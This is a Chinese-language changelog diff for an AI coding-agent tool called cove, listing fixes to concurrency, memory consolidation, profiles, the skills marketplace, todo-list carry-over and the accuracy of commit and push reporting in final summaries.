+- **同一批工具调用里读写并行**：`[edit P, read P]` 可能读到修改前或写了一半的文件；现在读写分组先后执行。
+- **只裁剪的压缩反复把任务列表追加到用户第一条消息**。
+- **子代理与记忆整理的 `max_tokens` 写死为 16000**，deepseek-chat 等输出上限 8192 的模型每次 400。
+- **流式空闲超时把建连与 429 重试等待也算进去**：本地模型长提示预填充超过 180 秒即被当成“用户取消”；
+  流式路径上被限流的 key 也不会冷却。
+- **两个 cove 进程写同一会话互相抹掉对方的回合**：覆盖前先把磁盘上的版本存进 `archive/`。
+- **记忆整理锁非原子**，两个后台整理进程可能同时持锁；整理与每轮记忆提取并发写同一文件时丢内容；
+  整理用的 grep 静默跳过大文件和超长行；清空的计划仍留在会话笔记里。
+- **profile**：保存任一 profile 会丢掉其他 profile 的 `max_turn_minutes` 等字段；激活 profile 时 `/model`、
+  `/api-key` 等修改写到顶层，重启后被 profile 覆盖回去，现在写回该 profile。
+- 任务运行中输入 `/history` 后的编号、`/base-url <地址>` 不再能改写正在使用的会话；headless 下 SIGTERM
+  结束整个运行，每轮不再泄漏一个 goroutine。
+- edit 模糊匹配把 CRLF 文件改成混合换行；流式输出跨分块的中文被截坏（含结尾半个字）；从文件开头插入时
+  diff hunk 头行号错误；Ctrl+R 无匹配时仍保留旧匹配；光标不在行尾时提示行溢出折行。
+- `team_delete a` 连带删除 `a-b` 队的成员；两个插件同名命令的胜出方随机；市场安装可能复制别的市场的同名插件；
+  大小写不同的插件名安装成功却报错；`depends: a, b` 带空格时依赖被丢弃；read 结果的 `[next: offset=N]`
+  不再被 guardrail 警告挤到非末行；停滞提示不再带光标控制码。
+- **技能市场从未真正可用**：`RegistryURL` 指向的 `skills-registry.json` 从未提交过（远端 404），
+  一直静默回退到内置列表，而内置列表的 5 个条目都没有 `url`；`/skill install` 又丢弃了
+  `InstallSkill` 的错误，结果是只写了一个占位 `SKILL.md` 却提示"成功安装"。现在补上
+  `skills-registry.json` 与 `skills/<name>/SKILL.md`（security-audit、api-design、dockerize、
+  i18n、ci-cd），内置回退列表与之保持一致（有测试锁定）；拉取注册表时检查 HTTP 状态码；
+  安装/创建失败如实报错，市场里没有的名字不再偷偷建空模板（改提示 `/skill create`），
+  安装成功的提示改为"重启后可用"（技能在引擎启动时加载）。
+
+- **任务总结混进上一个无关任务**：`todowrite` 的列表在整个会话里一直有效，上一个任务留下的
+  未完成项会跟着下一个无关请求——每 8 轮作为“你的任务列表”重新提醒，结束时 `todoFinishNudge`
+  还要求“做完这些项并完整重写报告”，两个任务的总结于是混在一起。现在列表照常保留（回答模型的提问、
+  `/resume` 后的第一句话都不会丢计划），但只有本回合调用过 `todowrite` 时才发结束前的“做完再重写报告”
+  提示，周期提醒对本回合没碰过的旧列表注明“只有最近的请求属于那项工作时才继续”。系统提示词
+  “Reporting back” 与退化结尾、完成前自检、收尾总结、todo 收尾提示都限定为“最近这条请求”。
+- **总结没说清是否已提交/推送**：系统提示词要求在 git 仓库里改了文件时说明是否已提交、已推送，
+  没执行的不能写得像做过，列给用户的命令要说明是给用户的步骤；收尾总结提示同样要求。另外引擎在
+  本轮改过文件或跑过 `git` 时，于最终报告下方显示一行来自 `git status` 的暗色状态（未提交 N 个文件 /
+  M 个提交未推送 / 没有上游 / 已推送），不依赖模型自述。
+
+### Changed
+- 文档里 clone 后的 `cd cove`、`cd cove/agent` 统一为 `cd cove-agent`（仓库更名遗漏）。
+- **授权提示去掉多余文字**：无法按规则记住的命令不再显示黄色的“这一行无法按规则记住：…。按 y
+  允许本次，n 拒绝”（选项里没有 `[a]` 已说明这一点，后半句又重复了选项行）；“已记住的规则未覆盖
+  这一行”的说明保留，改为暗色并去掉重复的后半句；“按键即答…”只在本进程第一次询问时显示。
+
 ## [11.7.0] - 2026-09-30
 
 ### Added
@@ -395,7 +727,7 @@
 
 ### Changed
 - **压缩语义标签**：压缩注入的上下文提示添加 <compress summary="..."> 标签，给模型清晰信号。
-- **Engine 重构**：抽取 stream_handler.go、	ool_runner.go、message_processor.go 分担 engine.go 职责；新增 uildMessageGraph() 为后续拓扑感知压缩做准备。
+- **Engine 重构**：抽取 stream_handler.go、tool_runner.go、message_processor.go 分担 engine.go 职责；新增 buildMessageGraph() 为后续拓扑感知压缩做准备。
 - **循环检测改进**：resetFingerprintHistory() 新增目录状态清理；hasToolCalls() 零值安全性提升。
 
 ### Fixed
